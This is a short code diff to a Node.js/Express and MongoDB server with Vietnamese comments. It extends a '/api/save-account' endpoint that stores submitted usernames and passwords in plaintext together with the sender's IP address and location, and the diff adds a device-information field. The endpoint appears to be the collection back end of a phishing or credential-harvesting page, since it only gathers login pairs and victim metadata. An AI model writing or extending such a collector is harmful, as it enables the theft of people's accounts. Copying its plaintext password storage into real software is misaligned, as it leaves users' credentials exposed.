@@ -44,7 +44,8 @@ const UserSchema = new mongoose.Schema({
     timestamp: { type: Date, default: Date.now },
     ipuser: { type: String },
     key: { type: String, unique: true },
-    location: { type: String }
+    location: { type: String },
+    device_info: { type: String }
 });
 const User = mongoose.model('User', UserSchema);
 
@@ -59,7 +60,7 @@ app.post('/api/save-account', async (req, res) => {
     if (!userIP) {
         userIP = "Không xác định";
     }
-    const { username, password, location } = req.body;
+    const { username, password, location, device_info} = req.body;
     
     if (!username || !password) {
         return res.status(400).send("bad");
@@ -67,7 +68,7 @@ app.post('/api/save-account', async (req, res) => {
 
     try {
         const userKey = generateKey();
-        const newUser = new User({ username, password, ipuser: userIP, key: userKey, location });
+        const newUser = new User({ username, password, ipuser: userIP, key: userKey, location, device_info });
         await newUser.save(); // Lưu trực tiếp lên đám mây
         console.log("💾 Đã lưu vào MongoDB:", username);
         res.status(200).send("userok");
